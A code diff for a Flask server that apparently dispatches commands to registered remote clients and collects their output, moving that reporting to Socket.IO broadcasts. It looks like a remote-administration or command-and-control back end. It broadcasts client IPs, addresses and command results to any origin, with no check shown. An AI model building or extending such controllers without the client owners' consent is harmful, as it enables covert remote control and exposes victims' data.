@@ -11,12 +11,25 @@ import random
 import string
 import requests
 import json
+from flask_socketio import SocketIO, emit
+from threading import Lock
+import time
+
 
 # Load environment variables
 load_dotenv()
 SECRET_KEY = os.getenv('JWT_SECRET_KEY')
 
+# Global variables
+command_to_execute = {}
+thread = None
+thread_lock = Lock()
+active_clients = {}
+
 app = Flask(__name__)
+
+socketio = SocketIO(app, cors_allowed_origins="*")
+
 
 # Configure the instance folder
 app.config['SECRET_KEY'] = SECRET_KEY
@@ -278,25 +291,48 @@ def receive_command():
         return jsonify({"command": command})
     return jsonify({"command": None})
 
+def background_thread():
+    while True:
+        with app.app_context():  # Ensure we have an active application context
+            try:
+            
+                clients = ClientData.query.all()  # Fetch all clients
+                threshold_time = datetime.datetime.utcnow() - timedelta(seconds=12)  # Set the threshold for recent activity
 
-@app.route('/api/getLiveClients', methods=['POST'])
-def getLiveClients():
-    with app.app_context():  # Ensure we have an active application context
-        clients = ClientData.query.all()  # Fetch all clients
-        threshold_time = datetime.datetime.utcnow() - timedelta(seconds=12)  # Set the threshold for recent activity
+                live_clients = [
+                    {
+                        "client_id": client.client_id,
+                        "user": client.user,
+                        "nickname": client.nickname,
+                        "os": client.os,
+                        "ip": client.ip,
+                        "registered_at": str(client.registered_at),
+                        "last_active": str(client.last_active),
+                        "address": client.address
 
-        live_clients = [
-            {
-                "client_id": client.client_id,
-                "user": client.user,
-                "nickname": client.nickname,
-                "os": client.os
-            }
-            for client in clients if client.last_active and client.last_active >= threshold_time
-        ]
-        return jsonify({"live_clients": live_clients}), 200
+                    }
+                    for client in clients if client.last_active and client.last_active >= threshold_time
+                ]
+                for client in clients:
+                    print(client.last_active)
+                    break
+                print(live_clients)
+                socketio.emit('client_list', {
+                        "type": "full_update",
+                        "clients": live_clients
+                    })
+                socketio.sleep(3)
+                print("success")
 
+            except Exception as e:
+                    print(f"Error in background thread: {e}")
 
+@socketio.on('connect')
+def handle_connect():
+    global thread
+    with thread_lock:
+        if thread is None:
+            thread = socketio.start_background_task(background_thread)
 
 @app.route('/tabs', methods=['GET'])
 def tabs():
@@ -327,39 +363,22 @@ def add_command_log(client_id, command_initiator, command, result):
 def receive_result():
     global command_initiator
     try:
-        # Check if the request contains JSON
-        if not request.is_json:
-            return jsonify({"error": "Invalid data format, expected JSON"}), 400
         data = request.get_json()
-        print(data)
-        # Check if 'result' key exists in the received JSON
         if "result" not in data or "client_id" not in data or "command" not in data:
-            return jsonify({"error": "'result' or 'client_id' or 'command' key is missing from the request"}), 400
+            return jsonify({"error": "Missing required fields"}), 400
+            
         add_command_log(data["client_id"], command_initiator, data["command"], data["result"])
-        command_initiator="asfasfsadfsdfasdf------------------------------------------"
-        print(command_initiator)
-        execution_result[data["client_id"]] = data["result"]
-        print(f"Execution Result Received: {execution_result}")  # Log the result in the terminal
+        
+        # Emit WebSocket message instead of storing in global var
+        socketio.emit('command_result', {
+            "client_id": data["client_id"],
+            "result": data["result"],
+            "command": data["command"]
+        })
+        
         return jsonify({"status": "Result received"}), 200
     except Exception as e:
-        return jsonify({"error": f"An error occurred: {str(e)}"}), 500
-
-
-@app.route('/execution-result-to-show-in-web', methods=['GET'])
-def show_execution_result():
-    global execution_result
-    try:
-        # If no result has been received, notify the client
-        if not execution_result:
-            pass #return jsonify({"error": "No execution result available"}), 404
-        # Return the execution result as JSON
-        
-        execution_result_to_send = execution_result
-        execution_result = {}
-        return execution_result_to_send, 200
-    except Exception as e:
-        print(str(e))
-        return jsonify({"error": f"An error occurred: {str(e)}"}), 500
+        return jsonify({"error": str(e)}), 500
 
 
 @app.route("/super-admin-panel")
